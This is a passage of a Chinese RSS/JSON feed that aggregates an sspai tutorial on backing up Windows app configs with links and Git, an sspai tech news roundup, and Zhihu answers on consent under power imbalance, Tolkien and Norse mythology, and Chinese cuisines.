target=\"_blank\">符号链接、硬链接及其在 Windows 上的应用举例</a></p>\n<p>将要使用的硬链接，我已经在上面文章简单说明了其原理和特性。硬链接只能指向同一卷已经存在的文件，这意味着我们必须把配置文件集中在<strong>系统盘内的一个目录</strong>。</p>\n<p>目录链接和符号链接类似，但只能用于目录。之所以使用目录链接而不是符号链接，是因为目录链接经微软调优过，Windows 系统自身各类目录的跳转也都使用目录链接，它具有更高的跳转效率以及同源目录更高的相似度，这样能避免一些奇怪问题。</p>\n<p><strong>遇到文件就使用硬链接，遇到目录就使用目录链接</strong>，创建的工具建议使用我在文中提到的 Link Shell Extension。</p>\n<p>至于是把链接放在同步目录还是将真正的文件放在里面，我习惯采用后面的方案，这样似乎更有安全感。如果发现移动配置文件夹后应用出错，则选用前面的方案。</p>\n<h3>管理工具和选择性同步：Git 与 .gitignore</h3>\n<p>OneDrive 等云盘并非为了同步多而小的文件设计：像是坚果云有秘而不宣的同步频率限制，同步这类小文本有概率丢失文件。很多配置文件一旦打开相应的应用，就是被占用状态，云盘无法同步。另外这些云盘也无法做到精确的选择性同步。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/22/article/e79242f799cf1a8510b1d832e8f33cc8\"><figcaption>OneDrive 同步文件被占用</figcaption></figure><p>因此我们使用天生为文本文件而设计的 Git，再使用 <code>.gitignore</code> 忽略掉无需跟踪的二进制文件。<code>.gitignore</code> 创建在 Git 库的根目录时对所有文件生效，创建在子文件夹时仅对该文件夹生效。</p>\n<h2>操作步骤</h2>\n<p>接下来我以用户根目录下 Git 的配置文件 <code>.gitconfig</code>、<code>Roaming</code> 下 Everything 的设置文件夹以及配置目录在文档中的 ShareX 为例，展示具体操作步骤。</p>\n<h3>移动配置文件（夹）</h3>\n<p>在系统盘的用户目录的任意位置创建一个文件夹 Settings，作为集中管理这些配置文件的地方。用 <code>git init</code> 初始化。</p>\n<p>然后，打开文件管理器设置中的「显示隐藏文件」，找到 Git、Everything 和 ShareX 的配置文件，在关闭这些应用的情况下，将文件或目录移动至 Settings 文件夹中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/22/article/b7bdf94fcee957e069ceceef82e24b44\"></figure><h3>创建链接</h3>\n<p>因为 <code>.gitconfig</code> 是一个文件，我们使用 Link Shell Extension 的中键拖拽功能，为它在原来的位置创建一个硬链接。</p>\n<p>同样的道理，给 ShareX 和 Everything 创建目录链接。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/22/5b90e21f2c78497951a8403f33d2b46c.png\"></figure><p>此时，可以打开这些应用检验一下功能是不是正常，配置文件应该会继续生效。</p>\n<h3>忽略非关键文件</h3>\n<p>在这三个例子中，Git 和 Everything 配置文件夹中没有什么好忽略的，我们可以观察 ShareX 的文件夹结构以及文件内容：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/22/article/4e8cda9fc020a704adaf2bbfb91c1926\"></figure><p>不难发现，Logs、Backup 文件夹中记录的是运行的日志和定时保存的无用文件，无需备份。因此在 ShareX 目录创建 .gitignore 写入下面内容：</p>\n<pre class=\"language-\"><code>/Logs \n/Backup</code></pre>\n<h3>提交到远程仓库并设置定时任务</h3>\n<p>一切准备就绪后，便能链接到远程仓库并提交了，在 GitHub 等处新建私人仓库后：</p>\n<pre class=\"language-\"><code>git add .\ngit commit -m \"Settings 2021-07-21\"\ngit remote add origin https://github.com/example/example.git\ngit push -u origin master\n</code></pre>\n<p>要设置定时提交，则可通过 Windows 任务计划程序和脚本，示例脚本如下：</p>\n<pre class=\"language-\"><code>$date = Get-Date -Format 'yyyy-MM-dd HH:mm'\ncd $home/Settings\ngit add .\ngit commit -m \"Autobackup $date\"\ngit push -q</code></pre>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/22/article/1973d7a7bda27f5f5fab94950926a2b7\"></figure><h2>小结</h2>\n<p>在 Windows 中，用户在 GUI 上对应用设置的更改会以文本文件或二进制文件的形式被保存在特定的几个文件夹中，只要存留了应用配置文件，只需一次配置，就能在重装系统、更换电脑后让应用们恢复如初。</p>\n<p>本文提供的方法是将所有需要备份的配置文件搬到同一个文件夹中，再用目录链接 &amp; 硬链接的方式将他们链接到原位置。此配置文件夹使用 Git 做版本管理和备份工具，不需要上传的文件用 <code>.gitignore</code> 来精确控制。</p>\n<p>只要能在本文提到的文件夹中发现配置文件的，包括 Windows 自己的一些设置，都可以试试本文的方法。</p>\n<p>希望能给你以启发。</p>\n<p>题图：<a href=\"https://www.freepik.com/vectors/abstract\" target=\"_blank\">Abstract vector created by vectorjuice</a></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67829"},{"title":"派早报：2020 东京奥运会将于今日开幕、Apple 开启 Apple Store 零售店夏令营活动等","date":"2021-07-23 00:59:02","description":"\n<h2>2020 东京奥运会将于今日开幕</h2>\n<p>北京时间 2021 年 7 月 23 日 19:00，推迟近一年的 2020 东京奥运会将会正式开幕，受到新冠疫情的影响，本届奥运会仅部分场地开放现场观赛，而大部分的观众将需要依靠电视网络技术远程观赛，为此奥委会打造了一套云上转播平台 OBS Cloud ，在转播平台方则支持 3D 追踪技术，并提供超高清、高动态范围的赛事内容。中国中央广播电视总台的 4K/8K 超高清转播车也首次派往海外奥运赛场。<a href=\"https://olympics.com/tokyo-2020/zh/ceremonies/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/23/article/f358143719c1a3725308a17c16be11cd\"></figure><p>同时 Google 也于昨天上线了与 STUDIO 4°C 合作的搜索引擎彩蛋，包含多个互动体育游戏。<a href=\"https://blog.google/products/search/tokyo-games-2021/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/23/article/abab5a3a1d0981ef0bb79e5890114d83\"></figure><h2>Apple 开启 Apple Store 零售店夏令营活动</h2>\n<p>7 月 22 日 Apple 宣布再次开启 Apple Store 零售店夏令营活动，今年夏令营活动中将带领参加的小朋友在两个小时的时间内，通过 iPad 以及可立拍 App 来制作自己的视频，创新培训师也会示范如何策划、调整拍摄角度以及画面的转场方式，并通过加入表情、贴纸等元素让作品更有趣生动，参加课程的小朋友还可以获得证书以及 Apple 夏令营 T 恤，家长们可以登录 Apple 官网底部的 Apple 夏令营 <a href=\"https://www.apple.com.cn/today/collection/applecamp/\" target=\"_blank\">链接</a> 进行活动报名，最快下周一即可参加。<a href=\"https://www.apple.com.cn/today/camp/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/23/article/69a73ead87556b6a56a18b7065e8da04\"></figure><h2>Google 公布 Wear OS 3 更新计划</h2>\n<p>Google 于 7 月 22 日正式统一了下一代的 Wear OS 平台名称：Wear OS 3 ，同时公布了哪些已发售的设备可以获得 Wear OS 3 更新，包括 TicWatch Pro 3（GPS/蜂窝数据版）以及 TicWatch E3，这些设备都采用了去年推出的高通骁龙 Wear 4100 处理器，另外 Google 暗示 Fossil 以及出门问问将推出新款智能手表，不会预装 Wear OS 3 而是在之后获得更新。<a href=\"https://9to5google.com/2021/07/22/wear-os-3-update/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/23/article/28956c4f3af77e2060469a204cbe14b2\"></figure><h2>大疆 MINI SE 无人机国内正式开售</h2>\n<p>7 月 22 日，本月初在海外发布的 MINI SE 昨日正式在国内发售，该无人机重量仅为 249 克，电池续航可满足 30 分钟飞行时间，最远可以飞行到 4 千米外，它还配备 3 轴 2.7K 机械增稳相机，内置的 DJI Fly app 也可以满足随拍随剪的需求，售价 1999 元。<a href=\"https://item.m.jd.com/product/100023102854.html?cu=true\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/23/article/ee2b3917adef26842337b5db17baf1d0\"></figure><h2>京东方公布 Mini LED 智慧一体机</h2>\n<p>7 月 22 日，京东方在 InfoComm China 2021 上公布其最新 Mini LED 智慧一体机，采用了 mini LED 背光技术，拥有 5376 个局部调光区，峰值亮度高达 1000 nits，对比度高达 1000000:1；此外 BOE 还将内置 AI 技术使其在办公、会议以及绘画三大场景中都有不错的表现。在展会上 BOE 还展示了其他物联网商用显示解决方案。<a href=\"https://finance.sina.cn/tech/2021-07-22/detail-ikqciyzk6965647.d.html?fromtech=1&amp;from=wap\" target=\"_blank\">来源</a></p>\n<h2>Twitter 正在测试推文上赞成和反对功能</h2>\n<p>7 月 22 日，Twitter 开始在 iOS 灰度测试推文的赞成和反对功能，部分 iOS 用户可以通过点击不同形状的按钮进行赞成或反对，反对票并不公开，赞成票键会显示为喜欢，投票也不会改变回复显示的顺序。目前 Twitter 方面暂未确认该功能后续会永久保留。<a href=\"https://mobile.twitter.com/TwitterSupport/status/1417920469265788931?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1417920469265788931%7Ctwgr%5E%7Ctwcon%5Es1_&amp;ref_url=https%3A%2F%2Fwww.theverge.com%2F2021%2F7%2F21%2F22587386%2Ftwitter-upvote-downvote-test-better-tweets\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/23/article/11ee9054a8117bc60067043dad9f1dbf\"></figure><h2>法拉第未来 <strong>FF 91 量产版开始接受预定</strong>\n</h2>\n<p>7 月 23 日，根据法拉第未来官网显示，FF 91 已开启预定，用户支付 5 万元预定金即可优先订购量产版的 FF 91，并参与「未来主义体验官」活动。FF 91 量产版采用了 Velodyne 首款车规级固态激光雷达和 NVIDIA DRIVE Orin 系统级自动驾驶芯片，具备高速公路自动驾驶和停车召唤功能。FF 91 单次充电行驶的里程数可超 482 公里，0-60 英里加速为 2.39 秒。FF 91 量产版将于 2022 年上半年正式上市。</p>\n<p>此外，法拉第未来也于今日在纳斯达克敲钟上市。<a href=\"https://finance.sina.com.cn/stock/usstock/c/2021-07-22/doc-ikqciyzk7044014.shtml\" target=\"_blank\">来源</a></p>\n<h2>华为云电脑宣布停止服务运营</h2>\n<p>7 月 22 日华为官方发布公告，宣布由于业务发展策略调整，华为云电脑将于 2021 年 8 月 15 日 23 点 59 分停止服务和运营，届时将无法登录和使用，在此之前有效套餐仍然可以正常使用，但由于停服后数据将会永久删除，因需要提前进行数据备份操作。<a href=\"https://www.pingwest.com/w/246470\" target=\"_blank\">来源</a></p>\n<h2>你可能错过的文章</h2>\n<ul>\n<li><a href=\"https://sspai.com/post/67804\" target=\"_blank\">🤔 万物选购指南：层次分析法治好了我的选择困难</a></li>\n<li><a href=\"https://sspai.com/post/67738\" target=\"_blank\">📌 从目标设定到逐步完成，这是我的人生规划方法论</a></li>\n<li><a href=\"https://sspai.com/post/67836\" target=\"_blank\">📙 具透 | 不透明的「半透明」：Windows 11 新材质如何欺骗你的眼睛</a></li>\n<li>🔋 <a href=\"https://sspai.com/post/67475\" target=\"_blank\">Android 省电模式自定义，打造更适合自己的长续航体验</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67876"},{"title":"如何判断「双方自愿」中弱势一方是真的自愿，而不是因为社会结构层级更低，信息差距导致的自以为自愿？","date":"2021-07-22 23:06:52","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-92a3f23e37c8ac6355a6b348bf94709a_l.jpg?source=8673f162\"><span>许标-心理咨询师，</span><span>提供当面和网络咨询，预约公众号psyche-space</span>\n<a href=\"https://www.zhihu.com/question/473154182/answer/2007669469\" hidden>阅读原文</a>\n</div>\n<div>\n<p>这是个好问题。我的回答依问题本身展开，不涉明星睡粉事件。</p>\n<p>我认为这个问题，要看从何种程度谈论。往深了，“自愿”涉及到“自由意志”，可上升到哲学、神经科学高度都存在极大分歧。</p>\n<p>如果按照某些哲学、神经科学观点，否定人的自由意志，也就不存在“自愿”一说——不论何种情形，双方关系是否存在强弱势，都不存在“自愿”。</p>\n<p>如果抛开这种“自由意志”的高度，降低些高度，从心理学角度看，也存在“斯德哥尔摩综合征（人质情结）”——指被害者对于犯罪者产生情感，甚至反过来帮助犯罪者，这个情感造成被害者对加害者产生好感、依赖性、甚至协助加害者。</p>\n<p>产生“斯德哥尔摩综合征”的人质，因好感、依赖性等帮助犯罪者的行为，并非来自犯罪者直接胁迫，可以说是人质的“自愿行为”。</p>\n<p><strong>可这种被挟持、面临生命危险的特殊情境下，人的身心状态显著异于常态。</strong>平时决策、计划等维持日常生活的偏理智系统，这时候让位于求生存的本能系统。</p>\n<p><strong>看似自愿行为，实际已经被本能求生系统主导，不够“自愿”——自主性，已经被情境极大过滤，受情境影响，这时候的自主性，远低于平时的自主性。</strong></p>\n<p>看似自愿，实非自愿。</p>\n<p>简单来说，意识已经被潜意识极大左右。</p>\n<p>被潜意识左右的意识，算“自愿”吗？</p>\n<p>这又回到“自愿”的定义了。</p>\n<p>如果把“自觉”——自己觉得是——定义自愿，被情境影响，被潜意识左右的意识，也算自愿；</p>\n<p>如果认为潜意识左右的意识，失去自由选择，则不算自愿。</p>\n<p>可人的心理，必然包含情境影响的部分，无法撇开情境单独谈论。</p>\n<p><strong>当双方关系在权力、地位、信息等方面，存在强弱势差别，强弱势身份差异带来的情境影响，已经无形渗透在双方关系、心理中，无法剥离这层影响，谈论所谓的“纯粹自愿”。</strong></p>\n<p>譬如像医患、师生、咨访（心理咨询师 - 来访者）等关系中，为何避免亲密关系为宜？</p>\n<p>因为这类关系中，先验存在内置的不平等——不论如何避免，都必然存在。</p>\n<p>这种内置的不平等，无形中影响关系的建立，自愿一说，无从谈起。</p>\n<p>不少这类关系的强奸行为，法律上用“诱奸”区分，表明受害者存在一定程度自愿。按照如上自愿理解，就像产生“斯德哥尔摩综合征”的人质，在不平等关系情境中的弱势方，“此自愿非彼自愿”，自主程度远低于平时，不算真正的自愿。</p>\n<p>大家如果接触一些社会心理学知识，便会知道，<strong>情境对人影响的重要性，被极大低估。</strong></p>\n<p>如同许多人觉得，如果回到二战时期，自己不会像德国或日本士兵，做出惨无人道的事情。可是近几十年内的斯坦福监狱实验、从众实验、旁观者效应实验等，被试均是受过高等教育者，却做出自认为不会做的残忍、冷漠、不理智等行为。</p>\n<p><strong>不要低估情境影响，不要高估意志作用。</strong></p>\n<p><strong>强弱势身份差异本身，能够带来足够多的无形影响，造成不存在“纯粹自愿”。</strong></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/473154182\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738392"},{"title":"有哪些对你影响很深的书籍？","date":"2021-07-22 23:06:43","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-8abdd08240bd28e7d9d6dbf7820e846c_l.jpg?source=8673f162\"><span>綾音Ayane，</span><span>三坑少女/妆娘/中国古代史/汉语言文学/女性向消费数码</span>\n<a href=\"https://www.zhihu.com/question/458440366/answer/1955634637\" hidden>阅读原文</a>\n</div>\n<div>\n<p>日常跑题系列。</p>\n<p>我想说的是托尔金三部曲。</p>\n<p>很早很早之前，我被《指环王》电影的小叶子深深地吸引。又过了几年，被小叶子他爸爸深深吸引。</p>\n<p>这就让我在之后的好几年里，一个是开始追星，追的是李佩斯。</p>\n<p>一个就是，开始喜欢托尔金，开始去补关于托尔金笔下的这个世界的一切。</p>\n<p>因为对托尔金体系的热爱，还有对于 wow 的历史的热爱——大家都知道，它们的许多设定起源是北欧神话。</p>\n<p>也因此，前两年我写了一篇关于北欧神话的文章。</p>\n<p>北欧神话如今只有留下的几个残篇，流传下来的故事甚至不能成为一个体系。</p>\n<p>但是，因为种种原因，北欧神话的设定，在现代的各种文学影视游戏等等作品里面是如此的常见。就如同北欧神话本身所说的，世界会毁灭并且重生。</p>\n<p>世界会不会毁灭还是未知，但是北欧神话本身真的毁灭，并且重生了。</p>\n<hr>\n<p><strong>《魔戒》</strong>是著名英国作家、语言学家、牛津大学教授<strong>约翰·罗纳德·瑞尔·托尔金</strong>创作的小说。它另一个更广为人知的名字是<strong>《指环王》</strong>。也许是因为《指环王》和《霍比特人》系列电影的大火，这一系列的故事都非常脍炙人口。</p>\n<p>这个系列的作品除了<strong>《魔戒》</strong>以外，还有<strong>《霍比特人》</strong>，<strong>《精灵宝钻》</strong></p>\n<p>（《精灵宝钻》之前因为版权问题未能出版，但是随着作者逝世 70 周年，这本书也终于得以出版了）</p>\n<p>很多人都说，托尔金为我们展现了一个新的世界，他开创了奇幻小说的先河，现如今许许多多的小说，游戏，动漫，影视作品都来源于托尔金的设定。</p>\n<p>那么，大家可知道这些设定起源于哪里呢。矮人，侏儒与精灵，世界树和人类的起源。</p>\n<p>这一切的一切，其实来自于一段失落的神话，它很早之前就已经被毁掉了，典籍被烧掉，神像被推入深渊，连那些故事也都变得残破，不再有人口口相传。</p>\n<p>可是，它竟然如同它自己预言的那般，在现代以另一种形式深入人心，它的故事和精神被我们所熟知，只是我们并不知道她的名字。</p>\n<p>这便是北欧神话，来自于遥远的挪威，来自于那个有美丽的极光，生产童话和传说的冰雪世界里。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-68f996e7594dfdf3fd0d6d7c9968f822_720w.jpg?source=8673f162\" alt=\"\"><figcaption>魔戒</figcaption></figure><p><strong>诸神的黄昏，北欧神话的毁灭与重生</strong></p>\n<p>选择这个词作为小标题，是因为这个词也来源于北欧神话。</p>\n<p><strong>诸神的黄昏</strong>(Götterdämmerung)指的是是北欧神话中诸神与巨人，怪物最终决战的时候。是北欧神话里面的世界末日，在那一天，世界毁灭并且重生。</p>\n<p>北欧神话也是如同这个词一般，经历了毁灭与重生。就像是东方传说中的凤凰，涅槃才得以重生。</p>\n<p>直到现在，我们许许多多的文学，影视，游戏作品都是源自于北欧神话，从托尔金的<strong>魔戒三部曲</strong>，到记录了一部分分８０后９０后青春的<strong>《仙境传说》《魔兽世界》</strong>，再到现在大火的<strong>《冰与火之歌》</strong></p>\n<p>本该湮灭于历史中的北欧神话，就这样以一个新的姿态出现在我们的流行文化里，并且发扬光大。</p>\n<p>北欧神话，又被称为挪威神话。顾名思义，它是北欧纳维亚地区特有的一个神话体系。北欧神话的形成时间晚于其他几个著名的神话体系。直到公元１世纪才开始有口头传播的记录，而到了公元七世纪，它才被传到冰岛等其他地区。</p>\n<p>年轻的北欧神话可以说的上是命途多舛了。中世纪的时候，基督教在欧洲盛行。在北欧诸国改信天主教之后，北欧神话被认为是异端邪说。作品被付之一炬，神像被推入深渊。如今我们所能窥见一二的北欧神话，仅仅来自于几个残篇。</p>\n<p>在冰岛，还有当年抛弃众神像的地方，那个地方现在仍然被叫做“众神的瀑布”，它也是著名的旅游景点。</p>\n<p>那么，北欧神话到底讲了些什么呢？</p>\n<figure><img src=\"https://pica.zhimg.com/v2-99d13ac33b35aa92d771050d3a8f2cf2_720w.jpg?source=8673f162\" alt=\"\"><figcaption>众神瀑布</figcaption></figure><p><strong>宇宙之树，冰与火的缝隙</strong></p>\n<blockquote><strong>在北欧神话中，世界曾只有两种东西 -- 南方是无尽的火焰，北方是黑暗的冰雾，而冰火相交之处，世界诞生了</strong></blockquote>\n<p>北欧神话和其他神话非常相似，在创世初，这世界上没有日月星辰，只有一片混沌。</p>\n<p>这片混沌里面有三个地方，有一个很大的被微光包围的无底沟。沟的北方是冥界，而沟的南方是<strong>火焰之国。</strong></p>\n<p>在一冷一热交汇的无底沟里，慢慢地就形成了霜，然后在这里诞生了<strong>霜巨人</strong>和一头<strong>母牛</strong>。后来，又诞生了众神的始祖，我们叫他<strong>祖神</strong>。</p>\n<p>讲到这里，无疑要感叹一下北欧人的浪漫，神和巨人都诞生在霜里，仿佛这个生活在冰雪里面的民族一般，透露着诗意。</p>\n<p>在北欧神话里，神普遍是善良的，巨人普遍是邪恶的，他们永远不能和平共处。祖神的孩子遇见了霜巨人的孩子，他们一见面就在想，这到底是不是传说中的神？这到底是不是传说中的巨人？算了不管了，打架吧。</p>\n<p>其实这个设定很像《魔兽世界》里面部落和联盟的设定啊。作为同样脱胎于北欧神话的作品，我充分相信魔兽的游戏策划也受到了这种设定的影响。毕竟作为联盟的我，第一次看见部落也是这种心态。</p>\n<p>后来，祖神的儿子娶了一个女巨人，生下了三个儿子，也正是他们，杀死了霜巨人，也因此赶走了其他的巨人。巨人们跑到了世界的边缘，建立了<strong>巨人之国</strong>。神成了世界的主宰，他们开始创造这个世界了。</p>\n<p>这三个儿子之中，就有我们熟悉的<strong>众神之王奥丁</strong>。他们创造了人，也创造了<strong>世界之树</strong>。世界之树的连接着九个世界（《仙境传说》中，换线要找世界之树也是这样的设定）。但是，在世界之树的根部，还有一条黑龙在不断咬着树根，等到哪天树被咬死了，也就到了前面所提到的“<strong>诸神的黄昏</strong>”</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-6885881ac1acf06a5a30f396885c0b2d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《霍比特人》剧照</figcaption></figure><p><strong>矮人与精灵的诞生</strong></p>\n<p>诸神创造了天地，日月，四季，人，和世界之树。人类的始祖分别是用<strong>梣树枝</strong>和<strong>榆树枝</strong>做的。</p>\n<p>这里又要感叹一下古代挪威人的想象空间，<strong>神明和巨人，正义与邪恶都来自于霜，霜可以转瞬即逝。而人是来自于树，代表着勃勃生机。</strong></p>\n<p>而在诸神创造天地的时候，在<strong>霜巨人</strong>的身体里诞生了很多的<strong>蛆虫</strong>。这些蛆因为诞生于霜巨人的躯体，吃着霜巨人的血肉，所以他们也是有灵性的（说到这里怎么有那么一点点恶心）。诸神发现了，就赋予了他们人类的形体和远超人类的智慧。这些蛆虫又分为两种，诞生于光的一面的变成了<strong>精灵</strong>（Alfar 也是 elf 的词源）他们被神明送到了半空中的精灵之家。</p>\n<p>另外一种在黑暗的一面诞生的，就被称为黑暗精灵，<strong>侏儒（Gnome）</strong>和<strong>矮人（Dwarf）</strong>。他们被神明送到了地下的侏儒之家。他们是天生的匠人，也为也为诸神打造了许多武器和首饰。但是神明不许他们白天出现，不然就会变成石头。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-1fcb5a4bd627deb0905798d2ec6c063d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《霍比特人》剧照，瑟兰迪尔与莱戈拉斯</figcaption></figure><p><strong>精灵</strong>为我们大家所熟知，《魔戒》里面不仅有精灵王子莱戈拉斯，还有精灵公主亚纹。河谷和密林都是精灵的聚集地。而且，在许许多多的游戏里精灵也是非常常见的种族。这些设定或多或少沿用了北欧神话的体系。但精灵这一神话种族也是衍生和二次创作最多的种族。</p>\n<p>而大多<strong>侏儒</strong>和<strong>矮人</strong>的设定都还没有什么变化，不仅在《魔戒》里面有矮人这个种族，甚至《霍比特人》他们还是主角之一。矮人之王拿着水晶项链的样子真是把精灵王瑟兰迪尔气得够呛。在其他作品里也能看见北欧神话的影子，无论是《魔兽世界》的侏儒，矮人和地精（又想到了特别有趣的副本诺莫瑞根），《哈利波特》里面的妖精。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-e6dec64b27bd8fbb2f490f66b44dc79c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《霍比特人剧照》比尔博和矮人们</figcaption></figure><p><strong>奥尔劳格的意志与托尔金的魔戒</strong></p>\n<p>奥尔劳格，是北欧神话里最早诞生的东西，似神非神，他什么都没做，却非常重要，他的存在很像是这个世界的秩序，所以，我用这个词作为这一章的小标题，来讲一讲北欧神话和托尔金体系的秩序传承。</p>\n<p>我们前面讲到了北欧神话里面人类的降生（男人的始祖是<strong>梣树枝，</strong>女人的始祖是<strong>榆树枝</strong>），还讲到了宇宙之树。由此可以看见，<strong>树在北欧神话里有一种很神秘的地位。</strong></p>\n<p>而树在魔戒三部曲中地位也特别特殊，从给予世界光明和水的世界树“<strong>瓦里诺双树</strong>”就可以看到。而且，精灵之王瑟兰迪尔和小叶子一家住的地方也是密林（亚纹的爸爸头衔是领主 Lord，而小叶子爸爸是 King）。</p>\n<p>同样都是树，同样都是“神树”的命运与家国天下息息相关。在北欧神话里，宇宙树死了，诸神就走向了黄昏，世界就走向了末日。而在《指环王》里，瓦里诺双树茂盛生长的时候，人世间就充满了光明，瓦里诺双树被摧毁了，世界就陷入了一片黑暗，神之国度也开始衰落。而努美诺尔白树也是如此，树生长茂盛的时候，努美诺尔就是一个美丽的国度，风调雨顺，气候宜人。而在这棵树被砍倒以后，努美诺尔也沉入了大海。</p>\n<p>有些人认为，托尔金会有这样的想法，是因为巫术的影响。但是，作为文学大家，又是科班出身的托尔金，他的每一个用意都是深刻的。他认真考据了北欧神话的残篇和传说，领悟了其中的精髓，再加上自己的创作，终于写成了魔戒三部曲。</p>\n<p>所以这一章我选用了秩序和意志作为标题。托尔金延续了北欧神话的意志，延续了古代挪威人民的信仰。也是他，最先让北欧神话得以重生。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-fe4e7d526885d1658274ba09b6dd0d71_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《指环王》剧照</figcaption></figure><p><strong>英雄的史诗与亮剑精神</strong></p>\n<p>《魔戒》系列一直都是非常有名的英雄主义小说。不管是阿拉贡，亚纹，弗罗多，莱戈拉斯，都是极其有特点的英雄人物。流浪的国王，美丽的精灵公主，勇敢的霍比特人（霍比特人的特征是胆小，随遇而安），善战的精灵王子。而他们每个人，都能在北欧神话遗留下来的作品里找到影子。</p>\n<p>比如说北欧神话的维达，他是众神之王奥丁的儿子，诸神的黄昏，奥丁葬身狼腹。他为父报仇，最后和巨蟒同归于尽。</p>\n<p>比如西古尔德，他是屠龙的英雄，却成为了婚姻的阴谋的牺牲品。</p>\n<p>北欧神话的神明和英雄们，都是悲剧人物。也许只有悲剧才能谱写出壮阔的史诗。《魔戒》之中也是如此。热爱家乡的霍比特人只能永远离开故乡，深爱着的人类国王和精灵公主却因为寿命不能白头偕老。最后亚纹没有和父亲一起东渡，也没能和阿拉贡一起死去。</p>\n<p>如果是在其他的神话作品里，最起码，阿拉贡能和亚纹要么白头偕老，要么一起死去。而《魔戒》却创造了这样的结局。这与北欧神话的观点不谋而合。屠龙的英雄没有娶回美丽大方的公主，而是娶来了一个阴谋，他应该享有至高无上的荣誉，却死在了姻亲兄弟的剑下。</p>\n<p>有历史学家分析过，北欧式的英雄，他们是把斩妖除魔当做自己天然的使命，这是他们人生的一部分，他们不会因此升华，却可能因此而死去。</p>\n<blockquote>“英雄与怪物战斗是出于他们的职责，而并非因为他们知道怪物必将失败，而神灵必将胜利。”</blockquote>\n<p>托尔金的故事里，那些英雄们也正是如此。这样的结局可能这正是北欧神话的传承。</p>\n<p>同样的，弱小的霍比特人弗罗多被选为“救世主”也充分的体现了北欧神话里的流浪精神，这是另外的一种北欧神话里特有的英雄情节。</p>\n<p>即使邪恶永远不能打败，即使美好的事物稍纵即逝，真正的勇士也会义无反顾的举起屠龙的利刃。哪怕这种斗争很可能是徒劳的。</p>\n<p>这其实很像现如今非常火的<strong>亮剑精神</strong>。狭路相逢勇者胜，哪怕知道必败，我也会尽我所能迎接敌人。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-6c4c171ed6ad5ad4710070524288f478_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《指环王》海报</figcaption></figure><p>托尔金不愧是当世大家，他用巧妙的手法，让已经消失的北欧神话再次重现在人们面前。中土就仿佛是一个真正的世界一样。他用这个绝望的故事给了无数的人们希望和勇气。</p>\n<p>也许北欧神话也是如此，就像他自己描述的一样，诸神的黄昏，世界迎来了末日，而最后世界终究会赢得新生。已经消亡的北欧神话，正在用另外一种方式重新融入我们的生活，给我们光明和希望，成为无数人心中的向往和勇气，像是它曾经指引古代挪威人一样，它现在也在指引着我们走向光明。</p>\n<blockquote>“据我所知，以前没有任何一位作家曾经创造出一个如此精细的虚幻世界和虚构历史。等到读者看完了这个三部曲，包括最后一册的附录时，他就会对托尔金的中土大陆，以及其中的景观、动植物群、人种和他们的语言、历史及文化气质了如指掌，就像是对自己]花园外的真实世界了如指掌一样。”</blockquote>\n<p>（本文写于 2019.9）</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/458440366\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738371"},{"title":"为什么八大菜系中除了鲁菜之外都在中国的南方？","date":"2021-07-22 23:06:38","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-1b2889cd21a77789194e961efc7f6f09_l.jpg?source=8673f162\"><span>ag獭，</span><span>好奇而无用的獭獭</span>\n<a href=\"https://www.zhihu.com/question/20436909/answer/1998692306\" hidden>阅读原文</a>\n</div>\n<div>\n<p>八大菜系这一说法，历史不会超过 50 